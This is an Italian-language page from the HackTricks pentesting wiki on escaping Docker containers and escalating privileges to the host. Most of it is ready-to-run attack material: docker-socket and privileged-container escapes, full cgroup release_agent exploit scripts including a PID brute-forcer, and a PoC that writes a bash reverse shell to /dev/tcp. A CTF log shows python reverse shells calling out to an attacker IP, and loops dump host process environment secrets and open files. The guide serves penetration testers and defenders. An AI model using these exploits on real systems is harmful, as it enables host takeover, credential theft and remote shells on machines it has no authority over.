# Docker Breakout / Escalazione dei privilegi

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare flussi di lavoro** supportati dagli strumenti comunitari **più avanzati al mondo**.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Enumerazione automatica ed escape

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Può anche **enumerare i container**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Questo strumento è molto **utile per enumerare il container in cui ti trovi e provare a scappare automaticamente**
* [**amicontained**](https://github.com/genuinetools/amicontained): Utile strumento per ottenere i privilegi del container al fine di trovare modi per scappare da esso
* [**deepce**](https://github.com/stealthcopter/deepce): Strumento per enumerare e scappare dai container
* [**grype**](https://github.com/anchore/grype): Ottieni le CVE contenute nel software installato nell'immagine

## Escape dal Docker Socket montato

Se in qualche modo scopri che il **socket di Docker è montato** all'interno del container Docker, sarai in grado di scappare da esso.\
Questo di solito accade nei container Docker che per qualche motivo devono connettersi al demone Docker per eseguire azioni.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
In questo caso puoi utilizzare i comandi docker regolari per comunicare con il demone docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Nel caso in cui il **socket di Docker si trovi in un posto inaspettato**, è comunque possibile comunicare con esso utilizzando il comando **`docker`** con il parametro **`-H unix:///percorso/verso/docker.sock`**
{% endhint %}

Il demone Docker potrebbe anche essere in ascolto su una porta (di default 2375, 2376) o, nei sistemi basati su Systemd, la comunicazione con il demone Docker può avvenire tramite il socket Systemd `fd://`.

{% hint style="info" %}
Inoltre, prestare attenzione ai socket di runtime di altri runtime di alto livello:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Fuga dall'abuso delle capacità

Dovresti controllare le capacità del container, se ha una o più delle seguenti, potresti essere in grado di fuggire da esso: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

È possibile controllare le capacità correnti del container utilizzando **gli strumenti automatici precedentemente menzionati** o:
```bash
capsh --print
```
Nella seguente pagina puoi **saperne di più sulle capacità di Linux** e su come abusarne per sfuggire/aumentare i privilegi:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Fuga dai container privilegiati

Un container privilegiato può essere creato con il flag `--privileged` o disabilitando specifiche difese:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Il flag `--privileged` abbassa significativamente la sicurezza del container, offrendo **accesso illimitato ai dispositivi** e bypassando **diverse protezioni**. Per una panoramica dettagliata, consulta la documentazione sugli impatti completi di `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Con queste autorizzazioni puoi semplicemente **passare allo spazio dei nomi di un processo in esecuzione nell'host come root**, come init (pid:1), eseguendo: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Provalo in un container eseguendo:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegiato

Solo con il flag privilegiato puoi provare ad **accedere al disco dell'host** o provare a **evadere sfruttando release\_agent o altre falle**.

Testa i seguenti bypass in un container eseguendo:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montaggio del disco - Poc1

I container Docker ben configurati non consentiranno comandi come **fdisk -l**. Tuttavia, in un comando Docker mal configurato in cui viene specificato il flag `--privileged` o `--device=/dev/sda1` con i privilegi, è possibile ottenere i privilegi per visualizzare l'unità host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Quindi, per prendere il controllo della macchina host, è banale:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
E voilà! Ora puoi accedere al filesystem dell'host perché è montato nella cartella `/mnt/hola`.

#### Montaggio del disco - Poc2

All'interno del container, un attaccante può tentare di ottenere un ulteriore accesso al sistema operativo sottostante dell'host tramite un volume hostPath scrivibile creato dal cluster. Di seguito sono riportate alcune cose comuni che puoi verificare all'interno del container per vedere se sfrutti questo vettore di attacco:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Fuga di privilegi sfruttando il release\_agent esistente ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="PoC iniziale" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Fuga privilegiata sfruttando il rilascio dell'agente creato ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Secondo PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Trova una **spiegazione della tecnica** in:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Fuga privilegiata sfruttando release\_agent senza conoscere il percorso relativo - PoC3

Nei precedenti exploit viene **rivelato il percorso assoluto del container all'interno del filesystem dell'host**. Tuttavia, questo non è sempre il caso. Nei casi in cui **non si conosce il percorso assoluto del container all'interno dell'host** è possibile utilizzare questa tecnica:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Eseguire il PoC all'interno di un container privilegiato dovrebbe fornire un output simile a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Fuga di privilegi sfruttando i mount sensibili

Ci sono diversi file che potrebbero essere montati e che forniscono **informazioni sull'host sottostante**. Alcuni di essi potrebbero addirittura indicare **qualcosa da eseguire dall'host quando accade qualcosa** (il che permetterebbe a un attaccante di evadere dal container).\
L'abuso di questi file potrebbe permettere che:

* release\_agent (già trattato in precedenza)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Tuttavia, puoi trovare **altri file sensibili** da controllare in questa pagina:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Mount arbitrari

In diverse occasioni potresti trovare che il **container ha un volume montato dall'host**. Se questo volume non è stato configurato correttamente, potresti essere in grado di **accedere/modificare dati sensibili**: leggere segreti, cambiare ssh authorized\_keys...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Escalazione dei privilegi con 2 shell e montaggio dell'host

Se hai accesso come **root all'interno di un container** che ha una cartella dell'host montata e sei riuscito a **scappare come utente non privilegiato verso l'host** e hai accesso in lettura alla cartella montata.\
Puoi creare un **file bash suid** nella **cartella montata** all'interno del **container** ed **eseguirlo dall'host** per ottenere un escalation dei privilegi.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Escalazione dei privilegi con 2 shell

Se hai accesso come **root all'interno di un container** e sei riuscito a **uscire come utente non privilegiato verso l'host**, puoi sfruttare entrambe le shell per **ottenere privilegi all'interno dell'host** se hai la capacità MKNOD all'interno del container (che è abilitata per impostazione predefinita) come [**spiegato in questo post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Con tale capacità, l'utente root all'interno del container è autorizzato a **creare file di dispositivo a blocchi**. I file di dispositivo sono file speciali utilizzati per **accedere all'hardware sottostante e ai moduli del kernel**. Ad esempio, il file di dispositivo a blocchi /dev/sda consente di **leggere i dati grezzi sul disco del sistema**.

Docker protegge dall'abuso dei dispositivi a blocchi all'interno dei container mediante l'applicazione di una politica cgroup che **blocca le operazioni di lettura/scrittura sui dispositivi a blocchi**. Tuttavia, se un dispositivo a blocchi viene **creato all'interno del container**, diventa accessibile dall'esterno del container tramite la directory **/proc/PID/root/**. Questo accesso richiede che il **proprietario del processo sia lo stesso** sia all'interno che all'esterno del container.

Esempio di **sfruttamento** da questo [**articolo**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Se puoi accedere ai processi dell'host, sarai in grado di accedere a molte informazioni sensibili memorizzate in quei processi. Esegui il laboratorio di test:
```
docker run --rm -it --pid=host ubuntu bash
```
Per esempio, sarai in grado di elencare i processi utilizzando qualcosa come `ps auxn` e cercare dettagli sensibili nei comandi.

Successivamente, poiché puoi **accedere a ogni processo dell'host in /proc/, puoi semplicemente rubare i loro segreti dell'ambiente** eseguendo:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
È possibile anche **accedere ai descrittori dei file di altri processi e leggere i file aperti da essi**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Puoi anche **interrompere i processi e causare un DoS**.

{% hint style="warning" %}
Se in qualche modo hai **accesso privilegiato a un processo al di fuori del container**, potresti eseguire qualcosa come `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` per **eseguire una shell con le stesse restrizioni ns** (sperabilmente nessuna) **di quel processo**.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Se un contenitore è configurato con il driver di rete Docker [host (`--network=host`)](https://docs.docker.com/network/host/), lo stack di rete di quel contenitore non è isolato dall'host Docker (il contenitore condivide lo spazio dei nomi di rete dell'host) e il contenitore non ottiene un proprio indirizzo IP allocato. In altre parole, il **contenitore collega tutti i servizi direttamente all'IP dell'host**. Inoltre, il contenitore può **intercettare TUTTO il traffico di rete che l'host** sta inviando e ricevendo sull'interfaccia condivisa `tcpdump -i eth0`.

Ad esempio, è possibile utilizzare questo per **sniffare e persino falsificare il traffico** tra l'host e l'istanza dei metadati.

Come negli esempi seguenti:

* [Writeup: Come contattare Google SRE: Ottenere una shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM consente l'elevazione dei privilegi di root (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Sarai in grado anche di accedere ai **servizi di rete collegati a localhost** all'interno dell'host o persino accedere alle **autorizzazioni dei metadati del nodo** (che potrebbero essere diverse da quelle a cui un contenitore può accedere).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Con `hostIPC=true`, si ottiene accesso alle risorse di comunicazione inter-processo (IPC) dell'host, come la **memoria condivisa** in `/dev/shm`. Ciò consente di leggere/scrivere dove le stesse risorse IPC sono utilizzate da altri processi dell'host o del pod. Utilizzare `ipcs` per ispezionare ulteriormente questi meccanismi IPC.

* **Ispeziona /dev/shm** - Cerca eventuali file in questa posizione di memoria condivisa: `ls -la /dev/shm`
* **Ispeziona le strutture IPC esistenti** - Puoi verificare se vengono utilizzate strutture IPC con `/usr/bin/ipcs`. Verificalo con: `ipcs -a`

### Recupera le capacità

Se la chiamata di sistema **`unshare`** non è vietata, è possibile recuperare tutte le capacità eseguendo:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abuso dello spazio dei nomi utente tramite symlink

La seconda tecnica spiegata nell'articolo [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica come è possibile abusare dei bind mount con gli spazi dei nomi utente, per influenzare i file all'interno dell'host (in quel caso specifico, eliminare file).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro supportati dagli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE

### Exploit di Runc (CVE-2019-5736)

Nel caso in cui tu possa eseguire `docker exec` come root (probabilmente con sudo), puoi provare ad elevare i privilegi sfuggendo da un container sfruttando CVE-2019-5736 (exploit [qui](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Questa tecnica sovrascriverà essenzialmente il binario _**/bin/sh**_ dell'**host** **da un container**, quindi chiunque esegua docker exec potrebbe attivare il payload.

Modifica il payload di conseguenza e compila main.go con `go build main.go`. Il binario risultante dovrebbe essere posizionato nel container Docker per l'esecuzione.\
All'esecuzione, non appena visualizza `[+] Overwritten /bin/sh successfully`, devi eseguire quanto segue dalla macchina host:

`docker exec -it <nome-container> /bin/sh`

Questo attiverà il payload presente nel file main.go.

Per ulteriori informazioni: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Il container potrebbe essere vulnerabile ad altre CVE, puoi trovare un elenco su [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Fuga personalizzata da Docker

### Superficie di fuga di Docker

* **Spazi dei nomi**: Il processo dovrebbe essere **completamente separato dagli altri processi** tramite spazi dei nomi, quindi non possiamo sfuggire interagendo con altri processi a causa degli spazi dei nomi (di default non può comunicare tramite IPC, socket Unix, servizi di rete, D-Bus, `/proc` di altri processi).
* **Utente root**: Di default, l'utente che esegue il processo è l'utente root (tuttavia i suoi privilegi sono limitati).
* **Capacità**: Docker lascia le seguenti capacità: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscall**: Questi sono i syscall che l'**utente root non sarà in grado di chiamare** (a causa della mancanza di capacità + Seccomp). Gli altri syscall potrebbero essere utilizzati per tentare di sfuggire.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="chiamate di sistema arm64" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
